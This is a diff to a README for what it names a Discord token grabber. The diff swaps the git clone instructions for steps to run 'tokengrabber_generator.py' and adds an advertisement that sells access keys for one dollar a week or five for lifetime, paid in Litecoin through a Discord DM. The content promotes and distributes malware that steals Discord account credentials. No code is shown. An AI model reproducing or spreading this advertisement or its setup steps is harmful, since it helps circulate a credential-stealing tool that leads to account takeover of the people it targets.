@@ -29,7 +29,7 @@ Make sure you have **Python 3.6+** installed on your system.
 *   [Download Python from python.org](https://python.org)
 
 ### 2. Download the Script
-Clone this repository or download it as a ZIP:
-```bash
-git clone https://github.com/aroscripts2511/Discord-T0k3n-Grabber.git
-cd Discord-T0k3n-Grabber
+Once the script is downloaded, head to your downloads page and move the python file to your desktop then copy the directory at the top and do cd "directory" then do python tokengrabber_generator.py
+customize all settings how you want
+
+## Buy keys for 1 dollar for 1 week and 5 dollars for lifetime. my discord is itsaro_ dm me to buy (only take ltc)
